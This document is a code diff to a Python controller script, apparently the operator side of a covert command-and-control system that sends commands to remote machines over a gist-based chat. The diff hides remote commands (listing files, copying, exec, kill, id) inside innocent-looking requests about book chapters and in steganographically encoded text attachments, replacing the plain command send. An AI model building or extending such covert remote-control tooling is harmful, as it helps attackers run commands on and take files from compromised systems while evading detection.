@@ -1,40 +1,41 @@
 import sys
+import uuid
 
 sys.path.append('..')
 from common.utils import add_message, check_chat_file
 from common.utils import CONTROLLER_NICK_NAME
 from common.gist import init_gist
-# from common.chapters import get_chapter_for_path_encoding, read_chapter
-# from common.steganography import encode_to_text
+from common.chapters import get_chapter_for_path_encoding, get_chapter_for_command, read_chapter
+from common.steganography import encode_to_text
 
 
-# def encode_path(pth):
-#     chapter_for_encoding = get_chapter_for_path_encoding()
-#     chapter_text = read_chapter(chapter_for_encoding)
-#     encoded_pth, used_length = encode_to_text(pth, chapter_text)
-#     return encoded_pth[0:used_length]
+def encode_path(pth):
+    chapter_for_encoding = get_chapter_for_path_encoding()
+    chapter_text = read_chapter(chapter_for_encoding)
+    encoded_pth, used_length = encode_to_text(pth, chapter_text)
+    return encoded_pth[0:used_length]
 
 
 def process_cmd(cmd):
     if len(cmd) == 0:
         return
 
-    if cmd == 'w':
-        print('Adding w command...')
-    elif cmd.startswith('ls '):
-        print('Adding ls command...')
-    elif cmd == 'id':
-        print('Adding id command...')
-    elif cmd.startswith('cp '):
-        print('Adding cp command...')
-    elif cmd.startswith('exec '):
-        print('Adding exec command...')
-    elif cmd == 'kill':
-        print('Adding kill command...')
+    cmd_parts = cmd.split(' ')
+
+    if cmd == 'w' or cmd == 'id' or cmd == 'kill':
+        print(f'Adding {cmd} command...')
+        chapter = get_chapter_for_command(cmd)
+        add_message(f'Send me text of chapter {chapter}, please', CONTROLLER_NICK_NAME)
+    elif len(cmd_parts) == 2 and (cmd_parts[0] == 'ls' or cmd_parts[0] == 'cp' or cmd_parts[0] == 'exec'):
+        print(f'Adding {cmd_parts[0]} command...')
+        chapter = get_chapter_for_command(cmd_parts[0])
+        attachment = {
+            'name': str(uuid.uuid4()) + '.txt',
+            'content': encode_path(cmd_parts[1]),
+        }
+        add_message(f'Is this attachment part of chapter {chapter}?', CONTROLLER_NICK_NAME, attachment=attachment)
     else:
         print(f'Unknown command: {cmd}')
-
-    add_message(cmd, CONTROLLER_NICK_NAME)
 
 
 def run():
